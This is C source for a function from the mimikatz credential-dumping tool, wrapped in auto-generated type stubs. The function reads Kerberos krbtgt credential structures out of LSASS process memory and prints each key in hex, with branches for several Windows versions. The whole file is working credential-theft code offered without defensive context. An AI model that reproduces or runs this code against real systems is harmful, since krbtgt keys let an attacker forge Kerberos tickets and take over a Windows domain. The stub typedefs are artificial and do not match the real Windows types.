#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_21__   TYPE_7__ ;
typedef  struct TYPE_20__   TYPE_3__ ;
typedef  struct TYPE_19__   TYPE_2__ ;
typedef  struct TYPE_18__   TYPE_1__ ;
typedef  struct TYPE_17__   TYPE_15__ ;

/* Type definitions */
struct TYPE_21__ {TYPE_3__* address; int /*<<< orphan*/ * member_1; TYPE_3__* member_0; } ;
struct TYPE_20__ {int cbCred; TYPE_2__* credentials; } ;
struct TYPE_19__ {int /*<<< orphan*/  size; TYPE_3__* key; int /*<<< orphan*/  type; } ;
struct TYPE_18__ {int MajorVersion; scalar_t__ BuildNumber; } ;
struct TYPE_17__ {TYPE_1__ osContext; int /*<<< orphan*/ * hLsassMem; } ;
typedef  TYPE_3__* PVOID ;
typedef  TYPE_3__* PKIWI_KRBTGT_CREDENTIALS_64 ;
typedef  TYPE_3__* PKIWI_KRBTGT_CREDENTIALS_6 ;
typedef  TYPE_3__* PKIWI_KRBTGT_CREDENTIALS_5 ;
typedef  int /*<<< orphan*/  PCWSTR ;
typedef  TYPE_7__ KULL_M_MEMORY_ADDRESS ;
typedef  int /*<<< orphan*/  KIWI_KRBTGT_CREDENTIAL_64 ;
typedef  int /*<<< orphan*/  KIWI_KRBTGT_CREDENTIAL_6 ;
typedef  int /*<<< orphan*/  KIWI_KRBTGT_CREDENTIAL_5 ;
typedef  TYPE_3__ KIWI_KRBTGT_CREDENTIALS_64 ;
typedef  TYPE_3__ KIWI_KRBTGT_CREDENTIALS_6 ;
typedef  TYPE_3__ KIWI_KRBTGT_CREDENTIALS_5 ;
typedef  size_t DWORD ;

/* Variables and functions */
 int /*<<< orphan*/  KULL_M_MEMORY_GLOBAL_OWN_HANDLE ; 
 scalar_t__ KULL_M_WIN_BUILD_10_1607 ; 
 int /*<<< orphan*/  LPTR ; 
 void* LocalAlloc (int /*<<< orphan*/ ,size_t) ; 
 int /*<<< orphan*/  LocalFree (TYPE_3__*) ; 
 int /*<<< orphan*/  PtrToLong (int /*<<< orphan*/ ) ; 
 size_t PtrToUlong (int /*<<< orphan*/ ) ; 
 TYPE_15__ cLsass ; 
 int /*<<< orphan*/  kprintf (char*,...) ; 
 int /*<<< orphan*/  kuhl_m_kerberos_ticket_etype (int /*<<< orphan*/ ) ; 
 scalar_t__ kull_m_memory_copy (TYPE_7__*,TYPE_7__*,size_t) ; 
 int /*<<< orphan*/  kull_m_string_wprintf_hex (TYPE_3__*,size_t,int /*<<< orphan*/ ) ; 

void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
{
	DWORD sizeForCreds, i;
	KIWI_KRBTGT_CREDENTIALS_64 tmpCred64, *creds64;
	KIWI_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
	KIWI_KRBTGT_CREDENTIALS_5 tmpCred5, *creds5;
	KULL_M_MEMORY_ADDRESS aLsass = {addr, cLsass.hLsassMem}, aLocal = {&tmpCred6, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(addr)
	{
		kprintf(L"\n%s krbtgt: ", prefix);
		if(cLsass.osContext.MajorVersion < 6) // TODO: a field offset table
		{
			aLocal.address = &tmpCred5;
			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_5) - sizeof(KIWI_KRBTGT_CREDENTIAL_5)))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_5) + (tmpCred5.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_5);
				if(creds5 = (PKIWI_KRBTGT_CREDENTIALS_5) LocalAlloc(LPTR, sizeForCreds))
				{
					aLocal.address = creds5;
					if(kull_m_memory_copy(&aLocal, &aLsass, sizeForCreds))
					{
						kprintf(L"%u credentials\n", creds5->cbCred);
						for(i = 0; i < creds5->cbCred; i++)
						{
							kprintf(L"\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds5->credentials[i].type)));
							aLsass.address = creds5->credentials[i].key;
							if(aLocal.address = LocalAlloc(LPTR, PtrToUlong(creds5->credentials[i].size)))
							{
								if(kull_m_memory_copy(&aLocal, &aLsass, PtrToUlong(creds5->credentials[i].size)))
									kull_m_string_wprintf_hex(aLocal.address, PtrToUlong(creds5->credentials[i].size), 0);
								LocalFree(aLocal.address);
							}
							kprintf(L"\n");
						}
					}
					LocalFree(creds5);
				}
			}
		}
		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_BUILD_10_1607)
		{
			aLocal.address = &tmpCred6;
			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6)))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_6) + (tmpCred6.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_6);
				if(creds6 = (PKIWI_KRBTGT_CREDENTIALS_6) LocalAlloc(LPTR, sizeForCreds))
				{
					aLocal.address = creds6;
					if(kull_m_memory_copy(&aLocal, &aLsass, sizeForCreds))
					{
						kprintf(L"%u credentials\n", creds6->cbCred);
						for(i = 0; i < creds6->cbCred; i++)
						{
							kprintf(L"\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds6->credentials[i].type)));
							aLsass.address = creds6->credentials[i].key;
							if(aLocal.address = LocalAlloc(LPTR, PtrToUlong(creds6->credentials[i].size)))
							{
								if(kull_m_memory_copy(&aLocal, &aLsass, PtrToUlong(creds6->credentials[i].size)))
									kull_m_string_wprintf_hex(aLocal.address, PtrToUlong(creds6->credentials[i].size), 0);
								LocalFree(aLocal.address);
							}
							kprintf(L"\n");
						}
					}
					LocalFree(creds6);
				}
			}
		}
		else
		{
			aLocal.address = &tmpCred64;
			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_64) - sizeof(KIWI_KRBTGT_CREDENTIAL_64)))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_64) + (tmpCred64.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_64);
				if(creds64 = (PKIWI_KRBTGT_CREDENTIALS_64) LocalAlloc(LPTR, sizeForCreds))
				{
					aLocal.address = creds64;
					if(kull_m_memory_copy(&aLocal, &aLsass, sizeForCreds))
					{
						kprintf(L"%u credentials\n", creds64->cbCred);
						for(i = 0; i < creds64->cbCred; i++)
						{
							kprintf(L"\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds64->credentials[i].type)));
							aLsass.address = creds64->credentials[i].key;
							if(aLocal.address = LocalAlloc(LPTR, PtrToUlong(creds64->credentials[i].size)))
							{
								if(kull_m_memory_copy(&aLocal, &aLsass, PtrToUlong(creds64->credentials[i].size)))
									kull_m_string_wprintf_hex(aLocal.address, PtrToUlong(creds64->credentials[i].size), 0);
								LocalFree(aLocal.address);
							}
							kprintf(L"\n");
						}
					}
					LocalFree(creds64);
				}
			}
		}
	}
}